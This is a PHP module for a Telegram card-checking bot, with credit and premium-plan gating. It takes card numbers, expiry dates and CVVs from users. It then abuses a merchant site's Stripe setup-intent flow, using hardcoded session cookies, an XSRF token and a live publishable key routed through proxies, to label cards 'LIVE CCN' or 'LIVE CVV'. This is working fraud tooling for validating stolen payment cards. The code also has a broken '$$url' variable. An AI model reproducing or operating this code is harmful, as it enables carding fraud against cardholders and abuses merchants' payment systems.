<?php
#require_once 'function.php';

$gate = 'mass';
$gateName = 'Stripe auth 2';

#sendMessage($chat_id, $chat_type, $message_id);
verificarGate($gate, $chat_id, $message_id);

$datosUsuario = userData($user_id, $username, $chat_id, $message_id);
$rango = $datosUsuario['rango'];
$creditos = $datosUsuario['creditos'];
$anti_spam = $datosUsuario['anti_spam'];
$plan = $datosUsuario['plan'];
$warns = $datosUsuario['warns'];
$last_message_time = $datosUsuario['last_message_time'];

if($warns > 2){
  sendMessage($chat_id,"<b>⚠ You have accumulated +2 warns.\nPlease contact the $owner.</b>",$message_id);
  exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Time remaining: $tiempo_restante seconds.", $message_id);
    exit();
}

if ($plan !== 'premium' && $chat_type === 'private') {
    sendMessage($chat_id, "<b>⚠ Error:</b> This command is only available for premium users.", $message_id);
    exit();
} elseif ($chat_type === 'supergroup') {
    $creditos = groupPlan($chat_id, $message_id);
}

if ($creditos <= 2) {
    sendMessage($chat_id, "<b>⚠ Error: You don't have enough credits.</b>", $message_id);
    exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Tiempo restante: $tiempo_restante segundos.", $message_id);
    exit();
}

updateTime($user_id);

$lista = clean($message) ?: clean($r_message);
$exploded = multiexplode(array(":", "/", " ", "|", "::"), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

$mes = ltrim($mes, '0');
$ano = strlen($ano) == 2 ? '20' . $ano : $ano;

validateCreditCard($cc, $cvv, $mes, $ano, $gate, $gateName, $chat_id, $message_id);

/* BIN INFO[informacion del bin] */

$datoscc = "$cc|$mes|$ano|$cvv";
$ccbin = substr($cc, 0, 6);

$tiempo = microtime(true);
$mytime = 'time1';

$binData = getBinData($ccbin);

if($binData['level'] == 'prepaid'){
  sendMessage($chat_id, "<b>⚠ Error: bin prepaid locked.\nContact the owner $owner if you think it's a mistake.</b>", $message_id);
  exit();
}


$lod = "<em>
    🔄 Please Wait ...
    Card : <code>$datoscc</code>
    Country : {$binData['pais']} {$binData['flag']}
    Bank : {$binData['banco']}
    ━━━━━━━━━━━━━━
    Time : {$mytime($tiempo)}s
    By : @DEVPHPJS
    </em>";

$m1 = sendMessage($chat_id, $lod, $message_id);
$m1 = $m1['result']['message_id'];

#exit();

$$url = 'https://moodzer.com/spark/token';
$headers = array(
    'authority: moodzer.com',
    'accept: application/json, text/plain, */*',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/json;charset=utf-8',
     'cookie: __stripe_mid=2365e5c6-107e-4f84-aaec-9dfef35a680c2a8f45; __stripe_sid=dae43e85-9bdd-41c8-9b1f-9b98fca7b42d82cdd7; XSRF-TOKEN=eyJpdiI6IkNFUjBpN1poUE15ZGV2eW9ic0VXSFE9PSIsInZhbHVlIjoid3B0VEVDNUZxMVZySGtRcU1IdVBKTUFqenJ1b2lrVzY0R2NZdVdoSzhUNDNYQllIVnBxVDVMNDVIWC94N1JVeE92MVFWNEpRZ0thd2lBbGtjaGIwd0wvQ2RKK3o0Z3EvU1AxcDNHRXY2ZXNsYkwwYTdyUUVIbGpuNnpZUUw5WXkiLCJtYWMiOiI2NWJkNmE2MmY2ZWY5YzA0MzBjYmVmZjlmMzUwODE0ZmQ4ZjA5NzIyZDUzMDQzNzIxMWRkMzZkMjEzYWJmZDRkIiwidGFnIjoiIn0%3D; moodzer_session=eyJpdiI6Img5RVVWSVplMXNhOWdMMi90Zmh3OGc9PSIsInZhbHVlIjoiZ3pQK004OXZYczdZZkptNkJVQ0g1aDNPRHU2YlQ3bGxzcWo0dUUyZyttbVBQaUhvR01yVnBXRDVoVE9GNFF6RitYeXhCa05kVDJxV2h0Z2ZnOHVMRTc3MkNCTmtHRTVybGp2alRlNjZrQWhJblQ2b2laWkhmZi8rSEdqcWZ4dXIiLCJtYWMiOiI5MGRmZTUzOTNmY2UzN2ZiYzYzN2M3ZTA2ZjgwYWE5MjQ1ZGFmNzhiNThjNmIwNDFjMGNlZjAzMmI0NDkyZGIyIiwidGFnIjoiIn0%3D',
    'referer: https://moodzer.com/billing?subscribe=plan_FY6GUxA6k81ZgB',
    'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
   'x-xsrf-token: eyJpdiI6IkNFUjBpN1poUE15ZGV2eW9ic0VXSFE9PSIsInZhbHVlIjoid3B0VEVDNUZxMVZySGtRcU1IdVBKTUFqenJ1b2lrVzY0R2NZdVdoSzhUNDNYQllIVnBxVDVMNDVIWC94N1JVeE92MVFWNEpRZ0thd2lBbGtjaGIwd0wvQ2RKK3o0Z3EvU1AxcDNHRXY2ZXNsYkwwYTdyUUVIbGpuNnpZUUw5WXkiLCJtYWMiOiI2NWJkNmE2MmY2ZWY5YzA0MzBjYmVmZjlmMzUwODE0ZmQ4ZjA5NzIyZDUzMDQzNzIxMWRkMzZkMjEzYWJmZDRkIiwidGFnIjoiIn0='
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_ENCODING, '');
$data1 = curl_exec($ch);
curl_close($ch);

$data = json_decode($data1, true);

$stripe = $data["clientSecret"];

$pos = strpos($stripe, "_secret_");

$seti = substr($stripe, 0, $pos);

$url = "https://api.stripe.com/v1/setup_intents/$seti/confirm";
$data = array(
  'payment_method_data[type]' => 'card',
  'payment_method_data[billing_details][name]' => 'dragon binner',
  'payment_method_data[card][number]' => $cc,
  'payment_method_data[card][cvc]' => $cvv,
  'payment_method_data[card][exp_month]' => $mes,
  'payment_method_data[card][exp_year]' => $ano,
  'payment_method_data[guid]' => '41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399',
  'payment_method_data[muid]' => '2365e5c6-107e-4f84-aaec-9dfef35a680c2a8f45',
  'payment_method_data[sid]' => 'dae43e85-9bdd-41c8-9b1f-9b98fca7b42d82cdd7',
  'payment_method_data[pasted_fields]' => 'number',
  'payment_method_data[payment_user_agent]' => 'stripe.js/b8f5754acc; stripe-js-v3/b8f5754acc',
  'payment_method_data[time_on_page]' => '253952',
  'expected_payment_method_type' => 'card',
  'use_stripe_sdk' => 'true',
  'key' => 'pk_live_i8QFc3Q93yHm5JmJkSZr0qtI',
  '_stripe_version' => '2020-03-02',
  'client_secret' => $stripe
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);

$headers = array(
  'Content-Type: application/x-www-form-urlencoded',
  'Accept: application/json',
  'Referer: https://js.stripe.com/',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$r2 = curl_exec($ch);
curl_close($ch);

$message = GetStr($r2,'message": "','"');

$decline_code = GetStr($r2, 'decline_code": "','"');


if (strpos($r2, 'incorrect_cvc')) {
    $status = "LIVE CCN ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r2, 'insufficient_funds')) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r2, '"status": "succeeded"')) {
    $status = "LIVE CVV ⚡";
    $response = "card added successfully ✅";
    restarCreditos($chat_id);
} else {
    $status = "REPROVADA 🔴";
    $response = $msg;
}

$cmdr = "
<a href='https://t.me/rudeos_greyrat_chk'> 𝙍𝙪𝙙𝙚𝙤𝙨_𝙘𝙝𝙠𝘽𝙤𝙩</a>
<em>                
[⁜] <b>card</b> ➳ <code>$datoscc</code>
[⁜] <b>status</b> ➳ $status
[⁜] <b>response</b> ➳ $response

[⁜] <b>search bin.</b> ➳ {$binData['pais']} {$binData['flag']}
{$binData['banco']} - {$binData['level']} - {$binData['tipo']}

[⁜] <b>Time</b> ➳ {$mytime($tiempo)}s
[⁜] <b>gate</b> ➳ $gateName
[⁜] <b>User</b> ➳ @$username [<b>$rango</b>]
[⁜] <b>$owner</b>
</em>";

editMessage($chat_id, $cmdr, $m1);
